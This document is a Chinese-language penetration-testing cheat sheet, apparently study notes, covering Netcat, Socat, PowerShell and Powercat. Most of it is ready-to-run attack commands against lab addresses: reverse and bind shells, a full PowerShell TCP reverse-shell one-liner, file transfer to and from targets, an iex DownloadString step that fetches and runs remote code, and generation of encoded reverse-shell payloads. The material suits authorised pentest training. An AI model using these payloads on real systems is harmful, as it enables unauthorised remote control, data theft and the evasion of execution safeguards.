# 3-Practical Tools

## Netcat

俗称”瑞士军刀“，使用TCP或UDP协议，通过网络连接读写数据的实用程序。

### 常用例子（格式一般为 nc 选项 IP 端口）：

连接目标的110端口：  `nc -nv 10.211.55.5 110` 

监听本地4444端口： `nc -nlvp 4444` 

### 传输文件:

接收文件： `nc -nlvp 4444 > incomfile` 

发送文件： `nc -nv 10.211.55.5 4444 < /home/kali/file1` 

### 绑定shell

```
nc -nvlp 4444 -e cmd.exe
```

### 反弹shell

```
nc -nv 10.211.55.5 4444 -e /bin/bash
```

## Socat

Socat 是一个命令行实用程序，它建立两个双向字节流并在它们之间传输数据。对于渗透测试，它类似于Netcat，但有额外的有用特性。

### Netcat vs Socat

```
nc <remote server's ip address> 80
socat - TCP4:<remote server's ip address>:80
```

### 常用例子

连接目标的443端口： `socat - TCP4:10.211.55.5:443` 

监听本地的443端口：  `sudo socat TCP4-LISTEN:443 STDOUT` 

### 传输文件

发送文件： `sudo socat TCP4-LISTEN:443,fork file:file1.txt` 

接收文件： `socat TCP4:10.211.55.5:443 file:received.txt,create` 

### 反弹shell

控制方：  `sudo socat -d -d TCP4-LISTEN:443 STDOUT` 

被控方： `socat TCP4:10.211.55.5:443 EXEC:/bin/bash` 

被控方（Windows）：  `socat TCP4:10.211.55.5:443 EXEC:'cmd.exe',pipes` 

### 绑定shell（无加密）

被控方： `sudo socat TCP4-LISTEN:43,fork EXEC:/bin/bash` 

控制方： `socat - TCP4:10.211.55.5:443` 

## PowerShell

Windows PowerShell 是一种基于任务的命令行shell和脚本语言。它是专门为系统管理员和高级用户设计的，用于快速自动化管理多个操作系统(Linux、macOS、Unix和Windows)以及与运行在这些操作系统上的应用程序相关的进程。

### 前提

首先要设置Powershell的执行策略为 Unrestricted

设置执行策略：  `Set-ExecutionPolicy Unrestricted` 

查看执行策略： `Get-ExecutionPolicy` 

### PowerShell 文件传输

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.211.55.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

### PowerShell 反弹shell

```
powershell -Command {$client = New-Object System.Net.Sockets.TCPClient('10.211.55.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
```

### PowerShell 绑定shell

```
`powershell -Command {$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()}
```

## Powercat

Powercat 本质上是由besimorhino编写的Netcat的PowerShell版本。这是一个我们可以下载到Windows主机上的脚本，以利用PowerShell的优势并简化绑定/反向shell的创建。

在kali上 `apt install powercat` 就可以下载脚本，默认放在/usr/share/windows-resources/powercat，可以通过传输文件的方式传输到目标windows上。

### 运行

1、从kali上将文件传输过来，然后用 `. .\powercat.ps1` 运行。

2、 `iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')` 

### 传输文件

发送文件：  `powercat -c 10.211.55.5 -p 443 -i C:\Users\Offsec\powercat.ps1` 

### 反弹shell

```
powercat -c 10.211.55.5 -p 443 -e cmd.exe
```

### 绑定shell

```
powercat -l -p 443 -e cmd.exe
```

### 用Powercat生成独立的payload

生成反弹shell脚本：`powercat -c 10.211.55.5 -p 443 -e cmd.exe -g > reverseshell.ps1` 

运行脚本： `./reverseshell.ps1` 

生成反弹shell编码数据： `powercat -c 10.211.55.5 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1` 

运行编码： `powershell.exe -E 编码的数据` 